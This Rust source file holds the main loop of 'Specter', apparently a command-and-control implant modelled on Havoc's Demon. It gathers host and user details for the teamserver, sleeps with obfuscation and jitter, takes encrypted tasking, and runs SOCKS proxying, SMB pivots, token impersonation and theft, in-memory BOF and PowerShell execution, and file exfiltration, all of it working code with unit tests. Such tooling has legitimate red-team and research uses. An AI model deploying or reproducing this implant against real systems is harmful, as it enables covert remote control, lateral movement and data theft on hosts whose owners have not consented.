//! Core agent logic: init handshake and callback loop.

use red_cell_common::crypto::{
    AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data_at_offset, derive_session_keys,
    derive_session_keys_for_version, generate_agent_crypto_material,
};
use red_cell_common::demon::{DemonCommand, DemonMessage};
use tracing::{info, warn};

use std::collections::HashMap;

use crate::metadata::{
    base_address, current_unix_secs, domain_name, hostname, is_elevated, local_ip, os_build,
    os_major, os_minor, os_service_pack, process_ppid, process_tid, username,
};

use crate::coffeeldr::{self, BofOutputQueue};
use crate::config::SpecterConfig;
use crate::dispatch::{self, DispatchResult, MemFileStore, PsScriptStore, Response};
use crate::download::DownloadTracker;
use crate::ecdh::EcdhSession;
use crate::error::SpecterError;
use crate::job::JobStore;
use crate::pivot::PivotState;
use crate::protocol::{
    AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
};
use crate::socket::SocketState;
use crate::token::TokenVault;
use crate::transport::FallbackTransport;

mod ecdh_loop;

/// Running state of a Specter agent session.
#[derive(Debug)]
pub struct SpecterAgent {
    pub(super) agent_id: u32,
    raw_crypto: AgentCryptoMaterial,
    session_crypto: AgentCryptoMaterial,
    pub(super) config: SpecterConfig,
    pub(super) transport: FallbackTransport,
    /// Shared monotonic CTR block offset, mirroring the server's single offset.
    ///
    /// Both encrypt (send) and decrypt (recv) operations use and advance this
    /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
    ctr_offset: u64,
    /// Monotonic sequence counter for server-side replay protection.
    ///
    /// Prepended as 8 LE bytes to every callback payload before encryption.
    /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
    callback_seq: u64,
    /// Token vault for impersonation/steal/make operations.
    pub(super) token_vault: TokenVault,
    /// Active file downloads being streamed back to the teamserver.
    pub(super) downloads: DownloadTracker,
    /// In-memory file staging area for `CommandMemFile` chunks.
    pub(super) mem_files: MemFileStore,
    /// Socket state for SOCKS5 proxy and reverse port forwarding.
    socket_state: SocketState,
    /// Pivot state for SMB pivot chain relay.
    pivot_state: PivotState,
    /// Job store for tracking background BOF threads and processes.
    pub(super) job_store: JobStore,
    /// Shared queue for callbacks produced by background BOF threads.
    pub(super) bof_output_queue: BofOutputQueue,
    /// In-memory PowerShell script store for `CommandPsImport`.
    pub(super) ps_scripts: PsScriptStore,
    /// Active ECDH session when `listener_pub_key` is set in config.
    ///
    /// When `Some`, all post-registration traffic uses AES-256-GCM session
    /// packets instead of the legacy Demon AES-CTR wire format.
    pub(super) ecdh_session: Option<EcdhSession>,
}

impl SpecterAgent {
    /// Create a new agent with a random ID and fresh crypto material.
    pub fn new(config: SpecterConfig) -> Result<Self, SpecterError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1; // ensure non-zero
        let raw_crypto = generate_agent_crypto_material()?;
        let session_crypto = match config.init_secret.as_deref() {
            None => raw_crypto.clone(),
            Some(secret) => {
                if let Some(version) = config.init_secret_version {
                    derive_session_keys_for_version(
                        &raw_crypto.key,
                        &raw_crypto.iv,
                        version,
                        &[(version, secret.as_bytes())],
                    )?
                } else {
                    derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
                }
            }
        };
        let transport = FallbackTransport::new(&config)?;

        info!(
            agent_id = format_args!("0x{agent_id:08X}"),
            hkdf_session = config.init_secret.is_some(),
            "agent initialized"
        );

        Ok(Self {
            agent_id,
            raw_crypto,
            session_crypto,
            config,
            transport,
            ctr_offset: 0,
            callback_seq: 1,
            token_vault: TokenVault::new(),
            downloads: DownloadTracker::new(),
            mem_files: HashMap::new(),
            socket_state: SocketState::new(),
            pivot_state: PivotState::new(),
            job_store: JobStore::new(),
            bof_output_queue: coffeeldr::new_bof_output_queue(),
            ps_scripts: PsScriptStore::new(),
            ecdh_session: None,
        })
    }

    /// Collect metadata about the current host environment.
    pub fn collect_metadata(&self) -> AgentMetadata {
        AgentMetadata {
            hostname: hostname(),
            username: username(),
            domain_name: domain_name(),
            internal_ip: local_ip(),
            process_path: std::env::current_exe()
                .map(|p| p.display().to_string())
                .unwrap_or_default(),
            process_pid: std::process::id(),
            process_tid: process_tid(),
            process_ppid: process_ppid(),
            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
            elevated: is_elevated(),
            base_address: base_address(),
            os_major: os_major(),
            os_minor: os_minor(),
            os_product_type: 1,
            os_service_pack: u32::from(os_service_pack()),
            os_build: os_build(),
            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
            sleep_delay: self.config.sleep_delay_ms,
            sleep_jitter: self.config.sleep_jitter,
            kill_date: self.config.kill_date.map_or(0, |kd| kd as u64),
            working_hours: self.config.working_hours.unwrap_or(0),
        }
    }

    /// Perform the DEMON_INIT handshake with the teamserver.
    ///
    /// Sends the init packet and validates the acknowledgement. On success,
    /// the local CTR state is synchronised with the shared teamserver offset.
    pub async fn init_handshake(&mut self) -> Result<(), SpecterError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(
            self.agent_id,
            &self.raw_crypto,
            &metadata,
            self.config.init_secret_version,
        )?;

        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");

        let response = self.transport.send(&packet).await?;
        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;

        // The init ACK consumes CTR blocks on the shared offset (server advances
        // the same counter when it encrypts the ACK).
        self.ctr_offset += ack_blocks;

        info!(
            agent_id = format_args!("0x{:08X}", self.agent_id),
            ctr_offset = self.ctr_offset,
            "DEMON_INIT handshake complete (monotonic CTR)"
        );

        Ok(())
    }

    /// Send a `COMMAND_CHECKIN` callback to the teamserver.
    pub async fn checkin(&mut self) -> Result<Vec<u8>, SpecterError> {
        let response = self.send_callback(DemonCommand::CommandCheckin, 0, &[]).await?;
        let tasking = parse_tasking_response(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            &response,
        )?;
        self.ctr_offset = tasking.next_recv_ctr_offset;

        Ok(tasking.decrypted)
    }

    /// Request queued tasking from the teamserver.
    pub async fn get_job(&mut self) -> Result<DemonMessage, SpecterError> {
        let response = self.send_callback(DemonCommand::CommandGetJob, 0, &[]).await?;
        let message = self.decrypt_job_message(&response)?;
        Ok(message)
    }

    /// Check whether the configured kill date has been reached.
    ///
    /// The kill date is stored as a Unix timestamp (seconds since
    /// January 1, 1970 UTC), matching the format emitted by the teamserver's
    /// payload builder and normalised by `common::domain::validate_kill_date`.
    /// Returns `true` when the current time meets or exceeds the deadline.
    pub(super) fn reached_kill_date(&self) -> bool {
        let Some(kill_date) = self.config.kill_date else {
            return false;
        };
        let now = current_unix_secs();
        now >= kill_date
    }

    /// Run the main agent loop: init, then dispatch server tasking repeatedly.
    ///
    /// Each iteration:
    /// 1. Checks whether the kill date has been reached; if so, notifies the
    ///    teamserver with `CommandKillDate` and terminates.
    /// 2. Sleeps for the configured interval (with optional jitter).
    /// 3. Sends a `CommandCheckin` heartbeat.
    /// 4. Sends `CommandGetJob` and dispatches any returned task packages.
    /// 5. Sends a response callback for each dispatched command.
    pub async fn run(&mut self) -> Result<(), SpecterError> {
        if self.config.listener_pub_key.is_some() {
            self.ecdh_init_handshake().await?;
            return self.run_ecdh_loop().await;
        }
        self.init_handshake().await?;

        loop {
            // ── Kill-date check ─────────────────────────────────────────
            if self.reached_kill_date() {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    kill_date = ?self.config.kill_date,
                    "kill date reached — notifying teamserver and exiting"
                );
                // Best-effort: notify the server. If the send fails we still
                // exit — the whole point of a kill date is unconditional cleanup.
                let _ = self.send_callback(DemonCommand::CommandKillDate, 0, &[]).await;
                return Ok(());
            }

            let delay = self.compute_sleep_delay();
            crate::sleep_obf::obfuscated_sleep(delay, self.config.sleep_technique).await;

            // Heartbeat — lets the server record liveness; response is normally NOJOB.
            if let Err(e) = self.checkin().await {
                warn!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    error = %e,
                    "checkin failed, will retry"
                );
                continue;
            }

            // Request and dispatch any queued server tasking.
            let message = match self.get_job().await {
                Ok(m) => m,
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "get_job failed, will retry"
                    );
                    continue;
                }
            };

            for package in &message.packages {
                // CommandSocket requires async I/O — handle it directly rather
                // than going through the synchronous dispatch() path.
                if package.command_id == u32::from(DemonCommand::CommandSocket) {
                    if let Err(e) =
                        self.socket_state.handle_command(package.request_id, &package.payload).await
                    {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            error = %e,
                            "socket command failed"
                        );
                    }
                    continue;
                }

                // CommandPivot manages SMB pipe state — handle it directly so
                // the PivotState can track connections and poll them later.
                if package.command_id == u32::from(DemonCommand::CommandPivot) {
                    if let Some(resp) = self.pivot_state.handle_command(&package.payload) {
                        let rid =
                            if resp.request_id != 0 { resp.request_id } else { package.request_id };
                        if let Err(e) =
                            self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                        {
                            warn!(
                                agent_id = format_args!("0x{:08X}", self.agent_id),
                                error = %e,
                                "failed to send pivot response"
                            );
                        }
                    }
                    continue;
                }

                let result = dispatch::dispatch(
                    package,
                    &mut self.config,
                    &mut self.token_vault,
                    &mut self.downloads,
                    &mut self.mem_files,
                    &mut self.job_store,
                    &mut self.ps_scripts,
                    &self.bof_output_queue,
                );
                if self.handle_dispatch_result(package.request_id, result).await {
                    // Exit requested — terminate.
                    return Ok(());
                }
            }

            // Poll active sockets, listeners, relays, and SOCKS clients.
            if self.socket_state.has_active_connections() {
                if let Err(e) = self.socket_state.poll().await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "socket poll failed"
                    );
                }
            }

            // Send any pending socket responses back to the teamserver.
            for resp in self.socket_state.drain_responses() {
                let req_id = resp.request_id;
                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send socket response"
                    );
                }
            }

            // Poll connected SMB pivots for child agent responses (mirrors
            // Demon's PivotPush).
            if self.pivot_state.has_active_pivots() {
                self.pivot_state.poll();
            }

            // Send any pending pivot responses back to the teamserver.
            for resp in self.pivot_state.drain_responses() {
                let req_id = resp.request_id;
                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send pivot response"
                    );
                }
            }

            // Push pending download chunks (mirrors Demon's DownloadPush).
            let fs_cmd_id = u32::from(DemonCommand::CommandFs);
            let download_packets = self.downloads.push_chunks(fs_cmd_id);
            for pkt in download_packets {
                if let Err(e) =
                    self.send_callback_raw(pkt.command_id, pkt.request_id, &pkt.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = pkt.command_id,
                        error = %e,
                        "failed to send download chunk"
                    );
                }
            }

            // Drain callbacks queued by background BOF threads and send them
            // to the teamserver as CommandInlineExecute responses.
            let bof_responses = self.drain_bof_output();
            for resp in bof_responses {
                if let Err(e) =
                    self.send_callback_raw(resp.command_id, resp.request_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send threaded BOF callback"
                    );
                }
            }

            // Poll tracked jobs for natural exit (mirrors Havoc's
            // JobCheckList).  Dead jobs get their handles closed and are
            // reaped so CommandJob/List reflects reality.  Only
            // JOB_TYPE_TRACK_PROCESS entries produce DIED notifications —
            // threads and plain processes are silently reaped.
            let tracked_dead = self.job_store.poll();
            let job_cmd_id = u32::from(DemonCommand::CommandJob);
            for (job_id, request_id) in &tracked_dead {
                let mut payload = Vec::with_capacity(8);
                payload.extend_from_slice(
                    &u32::from(red_cell_common::demon::DemonJobCommand::Died).to_le_bytes(),
                );
                payload.extend_from_slice(&job_id.to_le_bytes());
                if let Err(e) = self.send_callback_raw(job_cmd_id, *request_id, &payload).await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        job_id,
                        request_id,
                        error = %e,
                        "failed to send job-died notification"
                    );
                }
            }
            self.job_store.reap_dead();
        }
    }

    /// Process one dispatch result, sending any required response packets.
    ///
    /// Returns `true` if the agent should terminate.
    async fn handle_dispatch_result(&mut self, request_id: u32, result: DispatchResult) -> bool {
        match result {
            DispatchResult::Ignore => false,
            DispatchResult::Exit => {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    "CommandExit received — terminating"
                );
                true
            }
            DispatchResult::Respond(resp) => {
                let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                if let Err(e) = self.send_callback_raw(resp.command_id, rid, &resp.payload).await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send response"
                    );
                }
                false
            }
            DispatchResult::MultiRespond(resps) => {
                for resp in resps {
                    let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                    if let Err(e) =
                        self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                    {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            command_id = resp.command_id,
                            error = %e,
                            "failed to send response"
                        );
                    }
                }
                false
            }
        }
    }

    /// Drain pending BOF callbacks from background threads, converting each
    /// [`coffeeldr::BofCallback`] into a [`Response`] with the
    /// `CommandInlineExecute` command ID.
    pub(super) fn drain_bof_output(&self) -> Vec<Response> {
        let callbacks = match self.bof_output_queue.lock() {
            Ok(mut q) => std::mem::take(&mut *q),
            Err(poisoned) => std::mem::take(&mut *poisoned.into_inner()),
        };

        let cmd_id = u32::from(DemonCommand::CommandInlineExecute);
        callbacks
            .into_iter()
            .map(|cb| {
                let mut payload = Vec::with_capacity(4 + cb.payload.len());
                payload.extend_from_slice(&cb.callback_type.to_le_bytes());
                payload.extend_from_slice(&cb.payload);
                Response { command_id: cmd_id, request_id: cb.request_id, payload }
            })
            .collect()
    }

    /// Compute the sleep delay in milliseconds, applying jitter if configured.
    pub(super) fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }
        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let spread = jitter_range.saturating_mul(2);
        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
        base.saturating_sub(jitter_range).saturating_add(jitter)
    }

    /// Return the agent ID.
    #[must_use]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }

    /// Return the current shared CTR block offset.
    #[must_use]
    pub fn ctr_offset(&self) -> u64 {
        self.ctr_offset
    }

    /// Return the next sequence number that will be used in the next callback packet.
    #[must_use]
    pub fn callback_seq(&self) -> u64 {
        self.callback_seq
    }

    async fn send_callback(
        &mut self,
        command: DemonCommand,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Vec<u8>, SpecterError> {
        self.send_callback_raw(u32::from(command), request_id, payload).await
    }

    /// Send a callback packet with a raw `command_id` (used by the dispatch loop
    /// to forward arbitrary response command IDs without converting through the
    /// typed `DemonCommand` enum).
    async fn send_callback_raw(
        &mut self,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Vec<u8>, SpecterError> {
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            command_id,
            request_id,
            payload,
        )?;
        let response = self.transport.send(&packet).await?;

        // Monotonic CTR: advance the shared offset by the blocks consumed by the
        // encrypted portion: seq_num(8 LE) + payload_len(4) + payload_bytes.
        let encrypted_len = 8 + 4 + payload.len();
        self.ctr_offset += ctr_blocks_for_len(encrypted_len);
        self.callback_seq += 1;

        Ok(response)
    }

    // ── Legacy Demon-protocol helpers ─────────────────────────────────────────

    fn decrypt_job_message(&mut self, response: &[u8]) -> Result<DemonMessage, SpecterError> {
        if response.is_empty() {
            return Ok(DemonMessage::default());
        }

        let message = DemonMessage::from_bytes(response)?;
        let mut packages = Vec::with_capacity(message.packages.len());

        for mut package in message.packages {
            if !package.payload.is_empty() {
                // Monotonic CTR: decrypt each payload at the shared offset and
                // advance by the blocks consumed by the ciphertext.
                let ciphertext_len = package.payload.len();
                package.payload = decrypt_agent_data_at_offset(
                    &self.session_crypto.key,
                    &self.session_crypto.iv,
                    self.ctr_offset,
                    &package.payload,
                )?;
                self.ctr_offset += ctr_blocks_for_len(ciphertext_len);
            }
            packages.push(package);
        }

        Ok(DemonMessage::new(packages))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::demon::DemonPackage;

    #[test]
    fn agent_creation_succeeds() {
        let config = SpecterConfig::default();
        let agent = SpecterAgent::new(config);
        assert!(agent.is_ok());
        let agent = agent.expect("already checked");
        assert_ne!(agent.agent_id(), 0);
    }

    #[test]
    fn agent_without_init_secret_uses_raw_session_crypto() {
        let agent = SpecterAgent::new(SpecterConfig::default()).expect("agent creation");
        assert_eq!(agent.raw_crypto, agent.session_crypto);
    }

    #[test]
    fn agent_with_init_secret_derives_session_crypto() {
        let config = SpecterConfig {
            init_secret: Some(String::from("shared-init-secret")),
            ..Default::default()
        };
        let agent = SpecterAgent::new(config).expect("agent creation");

        assert_ne!(agent.raw_crypto, agent.session_crypto);
    }

    #[test]
    fn derive_session_keys_matches_external_hkdf_reference_vectors() {
        // Generated independently with Python's `cryptography` HKDF(SHA256).
        let agent_key = [
            0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd,
            0xee, 0xff, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10, 0x01, 0x23, 0x45, 0x67,
            0x89, 0xab, 0xcd, 0xef,
        ];
        let agent_iv = [
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee,
            0xff, 0x00,
        ];

        let alpha = derive_session_keys(&agent_key, &agent_iv, b"server-secret-alpha")
            .expect("alpha derivation");
        assert_eq!(
            alpha.key,
            [
                0x14, 0x9f, 0x14, 0xa0, 0xb5, 0xfc, 0xc3, 0xe1, 0x91, 0x2e, 0xf7, 0x33, 0x2b, 0x29,
                0x69, 0x58, 0x00, 0x2c, 0xaa, 0x64, 0x2a, 0xe2, 0xe5, 0x97, 0xcf, 0xc8, 0xcc, 0xb2,
                0x42, 0xa0, 0xcd, 0x84,
            ]
        );
        assert_eq!(
            alpha.iv,
            [
                0xff, 0x70, 0x00, 0x60, 0x9d, 0x52, 0x44, 0xb5, 0xbc, 0x8b, 0x82, 0xb9, 0x57, 0xaa,
                0x34, 0x48,
            ]
        );

        let bravo = derive_session_keys(&agent_key, &agent_iv, b"server-secret-bravo")
            .expect("bravo derivation");
        assert_eq!(
            bravo.key,
            [
                0x02, 0x83, 0xe9, 0x7f, 0x94, 0xbe, 0x88, 0x63, 0x4b, 0xef, 0xf0, 0x00, 0xab, 0x56,
                0x7b, 0xc6, 0xb0, 0xf9, 0x81, 0x1e, 0xfc, 0x8d, 0xda, 0xf4, 0x65, 0x6c, 0x65, 0xd4,
                0x8f, 0x56, 0xc3, 0x92,
            ]
        );
        assert_eq!(
            bravo.iv,
            [
                0x40, 0xcc, 0x14, 0x69, 0x4b, 0xc5, 0xf0, 0x10, 0xc9, 0x56, 0x79, 0x7a, 0xc1, 0x03,
                0x3b, 0xc2,
            ]
        );
    }

    #[test]
    fn agent_metadata_has_correct_arch_on_x86_64() {
        let config = SpecterConfig::default();
        let agent = SpecterAgent::new(config).expect("agent");
        let meta = agent.collect_metadata();
        if cfg!(target_arch = "x86_64") {
            assert_eq!(meta.process_arch, 2);
            assert_eq!(meta.os_arch, 9);
        }
    }

    #[test]
    fn compute_sleep_delay_no_jitter() {
        let config = SpecterConfig { sleep_delay_ms: 1000, sleep_jitter: 0, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert_eq!(agent.compute_sleep_delay(), 1000);
    }

    #[test]
    fn compute_sleep_delay_with_jitter_is_in_range() {
        // 50% jitter on 10000ms → jitter_range=5000, so output ∈ [5000, 15000].
        let config =
            SpecterConfig { sleep_delay_ms: 10000, sleep_jitter: 50, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        let mut seen_min = u64::MAX;
        let mut seen_max = u64::MIN;
        for _ in 0..200 {
            let delay = agent.compute_sleep_delay();
            assert!((5000..=15000).contains(&delay), "delay {delay} out of [5000, 15000]");
            seen_min = seen_min.min(delay);
            seen_max = seen_max.max(delay);
        }
        // Over 200 draws the spread must be non-trivial (> 100ms) — catches a cancelled jitter.
        assert!(
            seen_max - seen_min > 100,
            "jitter produced no spread: min={seen_min} max={seen_max}"
        );
    }

    #[test]
    fn ctr_accessor_reflects_current_offset() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        agent.ctr_offset = 7;

        assert_eq!(agent.ctr_offset(), 7);
    }

    #[test]
    fn callback_seq_starts_at_one() {
        let agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        assert_eq!(agent.callback_seq(), 1);
    }

    #[test]
    fn decrypt_job_message_decrypts_payloads_with_monotonic_ctr() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        // Monotonic CTR: the shared offset starts at some value and advances as
        // each payload is decrypted.  Simulate the server encrypting payloads at
        // successive offsets.
        let start_offset: u64 = 5;
        agent.ctr_offset = start_offset;

        let first_plaintext = vec![0xAA, 0xBB, 0xCC];
        let second_plaintext = vec![0x10; 17];

        // Server encrypts first payload at the current shared offset.
        let first_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            start_offset,
            &first_plaintext,
        )
        .expect("encrypt first payload");

        // Server advances offset after first payload.
        let offset_after_first =
            start_offset + red_cell_common::crypto::ctr_blocks_for_len(first_payload.len());

        let second_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            offset_after_first,
            &second_plaintext,
        )
        .expect("encrypt second payload");

        let response = DemonMessage::new(vec![
            DemonPackage::new(DemonCommand::CommandSleep, 1, first_payload),
            DemonPackage::new(DemonCommand::CommandCheckin, 2, Vec::new()),
            DemonPackage::new(DemonCommand::CommandOutput, 3, second_payload),
        ])
        .to_bytes()
        .expect("serialize job response");

        let message = agent.decrypt_job_message(&response).expect("decrypt job response");

        assert_eq!(message.packages.len(), 3);
        assert_eq!(message.packages[0].payload, first_plaintext);
        assert!(message.packages[1].payload.is_empty());
        assert_eq!(message.packages[2].payload, second_plaintext);
        // Monotonic CTR: offset must have advanced past the initial value.
        assert!(
            agent.ctr_offset() > start_offset,
            "CTR offset must advance after decrypting job payloads"
        );
    }

    // ── Kill-date tests ─────────────────────────────────────────────────────

    #[test]
    fn current_unix_secs_returns_reasonable_value() {
        let ts = current_unix_secs();
        // Must be after 2020-01-01 (Unix timestamp 1577836800).
        assert!(ts > 1_577_836_800, "unix timestamp {ts} should be after 2020");
    }

    #[test]
    fn reached_kill_date_false_when_none() {
        let config = SpecterConfig { kill_date: None, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_false_when_future() {
        // Set kill date far in the future (year ~2100, Unix timestamp 4102444800).
        let future_ts: i64 = 4_102_444_800;
        let config = SpecterConfig { kill_date: Some(future_ts), ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_true_when_past() {
        // Set kill date to a past time (2020-01-01, Unix timestamp 1577836800).
        let past_ts: i64 = 1_577_836_800;
        let config = SpecterConfig { kill_date: Some(past_ts), ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_false_when_none_not_zero() {
        // None means no kill date configured — should never trigger.
        let config = SpecterConfig { kill_date: None, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }
}
